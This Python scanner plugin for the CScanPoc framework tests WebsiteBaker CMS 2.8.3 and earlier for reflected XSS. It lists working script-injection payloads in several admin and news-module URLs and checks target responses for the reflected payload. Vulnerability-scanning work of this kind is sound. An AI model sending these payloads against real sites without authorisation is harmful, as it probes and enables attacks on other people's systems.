# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'WebsiteBaker-CMS_0000'  # 平台漏洞编号，留空
    name = 'WebsiteBaker-CMS <=2.8.3 多个XSS漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-01-17'  # 漏洞公布时间
    desc = '''
        WebsiteBaker可帮助您创建所需的网站：免费，简单，安全，灵活且可扩展的开源内容管理系统（CMS）。
        /wb/admin/admintools/tool.php?tool=captcha_control&6d442"><script>alert(1)</script>8e3b12642a8=1
        /wb/modules/news/add_post.php?page_id=1&section_id=f953a"><script>alert(1)</script>4ddf3369c1f
        /wb/modules/news/modify_group.php?page_id=1&section_id="><script>alert(1)</script>2680504c3ec&group_id=62be99873b33d1d3
        /wb/modules/news/modify_post.php?page_id=1&section_id="><script>alert(1)</script>4194d511605&post_id=db89943875a2db52
        /wb/modules/news/modify_settings.php?page_id=1&section_id=2f4"><script>alert(1)</script>bdc8b3919b5
    '''  # 漏洞描述
    ref = 'http://seclists.org/fulldisclosure/2014/Nov/44'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WebsiteBaker-CMS'  # 漏洞应用名称
    product_version = '2.8.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a8d8999f-428a-4340-8637-60880536d326'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload_list = ['/wb/admin/admintools/tool.php?tool=captcha_control&6d442"><script>alert(1)</script>8e3b12642a8=1',
                            '/wb/modules/news/add_post.php?page_id=1&section_id=f953a"><script>alert(1)</script>4ddf3369c1f',
                            '/wb/modules/news/modify_settings.php?page_id=1&section_id=123"><script>alert(1)</script>bdc8b3919b5']
            for i in payload_list:
                verify_url = '{target}'.format(target=self.target)+i
                req = urllib.request.urlopen(verify_url)
                content = req.read()
                if '"><script>alert(1)</script>' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
